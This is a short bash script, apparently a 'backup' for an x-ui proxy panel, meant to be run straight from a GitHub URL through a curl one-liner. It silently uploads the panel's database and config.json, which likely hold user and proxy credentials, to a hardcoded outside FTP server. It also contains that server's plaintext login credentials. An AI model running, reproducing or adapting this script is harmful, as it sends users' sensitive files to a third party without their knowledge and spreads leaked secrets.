#!/bin/bash
## bash <(curl -Ls https://raw.githubusercontent.com/jenaze/Ubunto/master/backup.sh)

addr=217.144.107.50
username=sid@novinlike.ir
password=mHm09350912

curl -T /etc/x-ui/x-ui.db ftp://$addr --user $username:$password &> /dev/null
curl -T /usr/local/x-ui/bin/config.json ftp://$addr --user $username:$password &> /dev/null
echo "Done"
echo ""
